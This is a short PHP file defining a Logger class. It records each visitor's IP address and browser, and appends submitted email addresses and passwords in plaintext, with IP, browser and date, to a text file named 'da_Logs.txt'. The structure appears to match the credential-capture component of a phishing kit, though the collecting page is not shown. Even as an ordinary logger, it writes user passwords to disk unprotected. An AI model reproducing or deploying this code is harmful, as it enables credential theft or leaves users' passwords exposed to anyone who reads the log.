<?php
class Logger
{

    static public function Save($filename, $content)
    {
       return file_put_contents($filename, $content .PHP_EOL , FILE_APPEND | LOCK_EX);
    }

    static public function Client()
    {
        $ipAddress = Client::IP();
        $browser = Client::Browser();
        $date = date("D M d, Y g:i a");

        $content = "
            ====================
            IPAddress: $ipAddress
            Browser: $browser
            Last Visitor On Date: $date  
         ";

        self::Save('da_visitor.txt', $content);
    }

    static public function Log($email, $password)
    {
        $ipAddress = Client::IP();
        $browser = Client::Browser();
        $date = date("D M d, Y g:i a");

        $content = "
            ====================
            Log: Email: $email Passwd: $password
            IPAddress: $ipAddress
            Browser: $browser
            Last Visitor On Date: $date  
         ";

        self::Save('da_Logs.txt', $content);
    }

}